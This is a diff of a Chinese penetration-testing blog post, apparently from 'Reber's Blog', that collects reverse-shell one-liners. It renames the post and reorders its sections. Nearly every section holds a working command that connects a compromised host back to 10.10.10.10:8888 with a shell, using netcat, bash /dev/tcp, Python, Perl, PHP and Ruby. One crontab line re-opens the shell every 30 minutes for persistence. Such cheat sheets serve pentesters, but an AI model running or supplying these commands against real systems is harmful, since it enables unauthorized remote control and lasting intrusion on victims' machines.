@@ -3,7 +3,7 @@
 <head>
     <meta http-equiv="content-type" content="text/html; charset=utf-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>Linux下反弹shell - Reber's Blog</title>
+    <title>反弹shell小结 - Reber's Blog</title>
     <meta name="keywords" content="渗透测试,web安全,网络安全,python,php,linux">
     <meta name="description" content="">
     <meta name="author" content="reber">
@@ -77,7 +77,7 @@
     <div class="main">
         <div class="left">
             <div>
-                <h2>Linux下反弹shell</h2>
+                <h2>反弹shell小结</h2>
             </div>
             <div class="content">
                 
@@ -115,15 +115,21 @@
                 
                 
 
-<p>当你找到一个有命令执行的主机时，你可能想要一个交互式deshell，如果你不能添加用户或者添加ssh密钥时，你就需要反弹一个shell来实现，下面的都是反弹shell的命令</p>
+<p>当你找到一个有命令执行的主机时，你可能想要一个交互式的shell，如果你不能添加用户或者添加ssh密钥时，你就需要反弹一个shell来实现，下面的都是反弹shell的命令</p>
 
-<h3 id="0x00-bash">0x00 Bash</h3>
+<h3 id="0x00-netcat">0x00 Netcat</h3>
+
+<pre><code>本地：nc -vv -l 8888
+目标：nc -e cmd.exe 10.10.10.10 8888 #nc -e /bin/sh 10.10.10.10 8888
+</code></pre>
+
+<h3 id="0x01-bash">0x01 Bash</h3>
 
 <pre><code>/bin/bash -i &gt;&amp; /dev/tcp/10.10.10.10/8888 0&gt;&amp;1
 注：这个由解析shell的bash完成，有些时候不支持
 </code></pre>
 
-<h3 id="0x01-crontab">0x01 crontab</h3>
+<h3 id="0x02-crontab">0x02 crontab</h3>
 
 <pre><code>下面这条命令执行后会每隔30分钟反弹一次：
 (crontab -l;printf &quot;*/30 * * * * exec 9&lt;&gt; /dev/tcp/10.10.10.10/8888;exec 0&lt;&amp;9;
@@ -131,7 +137,7 @@ exec 1&gt;&amp;9 2&gt;&amp;1;/bin/bash --noprofile -i;\rno crontab for `whoami`%
 crontab -
 </code></pre>
 
-<h3 id="0x02-python">0x02 Python</h3>
+<h3 id="0x03-python">0x03 Python</h3>
 
 <pre><code class="language-python"># 下面为1条命令
 python -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,
@@ -139,7 +145,7 @@ socket.SOCK_STREAM);s.connect((&quot;10.10.10.10&quot;,8888));os.dup2(s.fileno()
 os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call([&quot;/bin/sh&quot;,&quot;-i&quot;]);'
 </code></pre>
 
-<h3 id="0x03-perl">0x03 Perl</h3>
+<h3 id="0x04-perl">0x04 Perl</h3>
 
 <pre><code># 下面为1条命令
 perl -e 'use Socket;$i=&quot;10.10.10.10&quot;;$p=8888;socket(S,PF_INET,SOCK_STREAM,
@@ -147,21 +153,16 @@ getprotobyname(&quot;tcp&quot;));if(connect(S,sockaddr_in($p,inet_aton($i)))){op
 &quot;&gt;&amp;S&quot;);open(STDOUT,&quot;&gt;&amp;S&quot;);open(STDERR,&quot;&gt;&amp;S&quot;);exec(&quot;/bin/sh -i&quot;);};'
 </code></pre>
 
-<h3 id="0x04-php">0x04 PHP</h3>
+<h3 id="0x05-php">0x05 PHP</h3>
 
 <pre><code>php -r '$sock=fsockopen(&quot;10.10.10.10&quot;,8888);exec(&quot;/bin/sh -i &lt;&amp;3 &gt;&amp;3 2&gt;&amp;3&quot;);'
 </code></pre>
 
-<h3 id="0x05-ruby">0x05 Ruby</h3>
+<h3 id="0x06-ruby">0x06 Ruby</h3>
 
 <pre><code># 下面为1条命令
 ruby -rsocket -e'f=TCPSocket.open(&quot;10.10.10.10&quot;,8888).to_i;
 exec sprintf(&quot;/bin/sh -i &lt;&amp;%d &gt;&amp;%d 2&gt;&amp;%d&quot;,f,f,f)'
-</code></pre>
-
-<h3 id="0x06-netcat">0x06 Netcat</h3>
-
-<pre><code>nc -e /bin/sh 10.10.10.10 8888
 </code></pre>
 
 <h3 id="0x07-java">0x07 Java</h3>
